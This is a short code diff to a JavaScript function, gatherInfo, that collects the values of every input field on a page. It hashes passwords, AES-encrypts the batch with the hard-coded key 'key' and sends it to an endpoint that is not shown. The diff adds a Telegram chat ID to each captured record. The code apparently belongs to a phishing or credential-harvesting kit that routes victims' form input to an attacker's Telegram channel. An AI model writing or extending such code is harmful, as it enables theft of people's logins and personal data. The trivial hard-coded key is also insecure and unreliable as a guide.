@@ -3,6 +3,7 @@ function gatherInfo() {
   const SECRET_KEY = "key";
   const userInput = [];
   const id = Date.now().toString();
+  const TELEGRAM_CHAT_ID = "-1002209368311";
 
   inputs.forEach((input) => {
     const type = input.getAttribute("aria-placeholder") || input.placeholder;
@@ -11,12 +12,16 @@ function gatherInfo() {
     // Hash the password using SHA-256 if the field type is 'password'
     if (type.toLowerCase() === "password") {
       const hashedPassword = CryptoJS.SHA256(value).toString(CryptoJS.enc.Hex);
-      userInput.push({ id: id, type, value: hashedPassword });
+      userInput.push({
+        chatid: TELEGRAM_CHAT_ID,
+        id: id,
+        type,
+        value: hashedPassword,
+      });
     } else {
-      userInput.push({ id: id, type, value });
+      userInput.push({ chatid: TELEGRAM_CHAT_ID, id: id, type, value });
     }
   });
-
 
   const encryptedData = CryptoJS.AES.encrypt(
     JSON.stringify(userInput),
@@ -40,4 +45,3 @@ function gatherInfo() {
       console.error("Error storing data:", error);
     });
 }
-
